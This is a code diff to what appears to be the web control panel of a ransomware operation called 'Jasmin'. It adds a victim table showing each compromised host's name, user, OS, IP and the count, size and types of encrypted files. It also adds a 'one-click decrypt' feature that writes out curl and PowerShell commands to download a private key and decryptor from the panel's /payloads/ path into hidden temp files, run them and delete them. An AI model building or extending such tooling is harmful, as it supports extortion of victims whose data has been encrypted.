@@ -69,18 +69,29 @@
   <button type="submit"><i class="fas fa-search"></i></button>
 </form>
 <div class="table-wrap"><table>
-<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>位置</th><th>日期</th><th>时间</th></tr></thead>
+<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>日期</th><th>加密文件</th><th>合计大小</th><th>文件类型</th><th>操作</th></tr></thead>
 <tbody>
 {% if not victims %}
-<tr><td colspan="8" class="empty">暂无受害主机数据</td></tr>
+<tr><td colspan="10" class="empty">暂无受害主机数据</td></tr>
 {% endif %}
 {% for v in victims %}
+{% set es = v.encrypted_size|default(0)|int %}
+{% if es >= 1073741824 %}{% set sz = '%.2f GB'|format(es/1073741824) %}
+{% elif es >= 1048576 %}{% set sz = '%.2f MB'|format(es/1048576) %}
+{% elif es >= 1024 %}{% set sz = '%.2f KB'|format(es/1024) %}
+{% else %}{% set sz = es ~ ' B' %}{% endif %}
+{% set is_linux = 'linux' in (v.os|default('')|lower) or 'darwin' in (v.os|default('')|lower) %}
 <tr>
   <td>{{ loop.index + (page-1)*10 }}</td>
   <td>{{ v.machine_name }}</td><td>{{ v.computer_user }}</td>
   <td><span class="os-badge">{{ v.os }}</span></td>
-  <td>{{ v.ip }}</td><td>{{ v.location }}</td>
-  <td>{{ v.date }}</td><td>{{ v.time }}</td>
+  <td>{{ v.ip }}</td><td>{{ v.date }}</td>
+  <td style="color:#f59e0b;font-weight:600">{{ v.encrypted_count|default(0) }} 个</td>
+  <td style="color:#4dc3fa">{{ sz }}</td>
+  <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all">{{ v.encrypted_types|default('') }}</span></td>
+  <td style="white-space:nowrap">
+    <button class="btn-sm" style="background:#10b981" onclick="showDecrypt('{{ v.id }}','{{ v.ip }}',{{ 'true' if is_linux else 'false' }})" title="一键解密"><i class="fas fa-unlock"></i></button>
+  </td>
 </tr>
 {% endfor %}
 </tbody></table></div>
@@ -180,6 +191,22 @@ function showTab(t){
   var el=document.getElementById('panel-'+t);if(el)el.style.display='block';
   document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
   event.target.closest('.nav-item').classList.add('active');
+}
+var _decOpen=null;
+function showDecrypt(vid,ip,isLinux){
+  var srv=location.origin;
+  if(_decOpen){_decOpen.remove();if(_decOpen.dataset.vid==vid){_decOpen=null;return;}_decOpen=null;}
+  var btns=document.querySelectorAll('button[onclick*="showDecrypt"]');
+  var tr=null;for(var b of btns){if(b.onclick.toString().indexOf("'"+vid+"'")>-1){tr=b.closest('tr');break;}}
+  if(!tr)return;
+  var nr=document.createElement('tr');nr.dataset.vid=vid;
+  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';
+  if(isLinux){
+    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem -o /tmp/.jk\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jk /tmp/.jd</pre>';
+  }else{
+    td.innerHTML='<pre class="dt-code">$tmp="$env:TEMP\\jasmin_dec"\nNew-Item -ItemType Directory -Force -Path $tmp | Out-Null\nInvoke-WebRequest "'+srv+'/payloads/jasmin_private.pem" -OutFile "$tmp\\key.pem"\nInvoke-WebRequest "'+srv+'/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\\dec.exe"\n& "$tmp\\dec.exe" "$tmp\\key.pem"\nRemove-Item -Recurse -Force $tmp</pre>';
+  }
+  nr.appendChild(td);tr.after(nr);_decOpen=nr;
 }
 function genKey(){
   var r=document.getElementById('key-result');
